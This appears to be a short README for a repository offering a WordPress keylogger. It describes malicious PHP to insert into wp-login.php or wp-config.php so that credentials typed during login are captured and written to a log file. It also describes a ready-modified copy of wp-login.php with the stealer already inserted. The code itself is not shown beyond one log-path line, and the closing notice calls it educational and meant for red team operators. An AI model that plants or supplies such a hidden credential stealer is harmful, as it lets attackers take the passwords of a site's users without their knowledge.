# Wordpress Keylogger
Wordpress Keylogger for Credential Hijacking, Malicious code input into wp-login.php

## wp-login Keylogger.php
Malicious code to steal credentials in the middle of a login attempt, add it to your wp-config.php and change whatever is necessary, default name of the file with the credentials is: wp-keylogger.log

## wp-login-KEYLOGGER-ALREADY-INSERTED.php
The file is wp-login-KEYLOGGER-ALREADY-INSERTED.php is wp-login.php with the keylogger already inserted, but changes to the path are required to store the logs, please change the following line: $file_path=DIR. '/user_credentials.log';
```
NOTICE: This is an educational project, do not use without permission developed especially for RedTeam operators.
```
